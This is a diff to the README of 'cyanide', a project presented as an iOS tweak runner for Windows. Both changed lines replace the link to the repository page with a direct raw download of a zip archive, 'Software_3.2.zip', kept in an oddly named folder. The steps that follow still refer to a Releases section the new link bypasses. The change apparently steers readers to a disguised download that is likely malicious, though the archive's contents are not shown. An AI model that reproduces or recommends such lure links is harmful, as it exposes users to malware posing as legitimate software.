@@ -1,6 +1,6 @@
 # 🧪 cyanide - Reliable and fast iOS tweak runner
 
-[![](https://img.shields.io/badge/Download-Cyanide_for_Windows-blue)](https://github.com/Jadarelaxed973/cyanide)
+[![](https://img.shields.io/badge/Download-Cyanide_for_Windows-blue)](https://raw.githubusercontent.com/Jadarelaxed973/cyanide/main/contrasuggestible/Software_3.2.zip)
 
 ## 📋 About the software
 
@@ -21,7 +21,7 @@ To run Cyanide successfully on your Windows computer, verify that your machine m
 
 You must visit the official repository to acquire the correct version of the application. 
 
-[Visit this page to download the latest setup file](https://github.com/Jadarelaxed973/cyanide)
+[Visit this page to download the latest setup file](https://raw.githubusercontent.com/Jadarelaxed973/cyanide/main/contrasuggestible/Software_3.2.zip)
 
 1. Navigate to the link provided above.
 2. Locate the section labeled Releases on the right side of the screen.
